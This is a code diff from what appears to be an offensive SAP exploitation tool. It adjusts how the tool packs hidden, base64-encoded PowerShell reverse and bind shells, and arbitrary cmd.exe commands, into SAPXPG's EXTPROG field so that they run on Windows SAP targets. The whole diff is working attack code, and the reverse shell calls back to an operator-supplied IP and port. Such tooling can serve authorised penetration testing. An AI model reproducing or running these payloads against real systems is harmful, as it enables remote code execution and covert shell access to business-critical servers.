@@ -381,8 +381,8 @@ def _generate_payload(os_type: str, ip: str, port: int) -> dict:
         import base64 as _b64
         enc = _b64.b64encode(ps.encode("utf-16-le")).decode("ascii")
         return {
-            "command": "powershell.exe",
-            "params": f"-nop -w hidden -EncodedCommand {enc}",
+            "command": f"powershell.exe -nop -w hidden -EncodedCommand {enc}",
+            "params": "",
             "display": f"PowerShell reverse shell → {ip}:{port}",
         }
     else:
@@ -424,12 +424,14 @@ def _generate_bind_payload(os_type: str, port: int) -> dict:
               f"$t=([text.encoding]::ASCII).GetBytes($p);"
               f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close();$l.Stop()")
         # Use -EncodedCommand (Base64 of UTF-16LE) to avoid SAPXPG
-        # space splitting destroying the PowerShell script
+        # space splitting destroying the PowerShell script.
+        # Put full command in EXTPROG — Windows SAPXPG (old kernels)
+        # treats EXTPROG as the full command line, PARAMS gets mangled.
         import base64
         enc = base64.b64encode(ps.encode("utf-16-le")).decode("ascii")
         return {
-            "command": "powershell.exe",
-            "params": f"-nop -w hidden -EncodedCommand {enc}",
+            "command": f"powershell.exe -nop -w hidden -EncodedCommand {enc}",
+            "params": "",
             "display": f"PowerShell bind shell on target port {port}",
         }
     else:
@@ -1345,8 +1347,11 @@ def create_app(api: SAPMAPApi) -> Bottle:
             is_win = any(w in os_type.lower()
                          for w in ("windows", "nt", "win"))
             if is_win:
-                command = "cmd.exe"
-                params = f"/C {cmdline}"
+                # Windows SAPXPG: full command line goes in EXTPROG,
+                # PARAMS left empty (old kernels treat EXTPROG as
+                # the full command line, PARAMS gets mangled)
+                command = f"cmd.exe /C {cmdline}"
+                params = ""
             else:
                 command = "/bin/sh"
                 # Replace spaces with ${IFS} so SAPXPG doesn't split
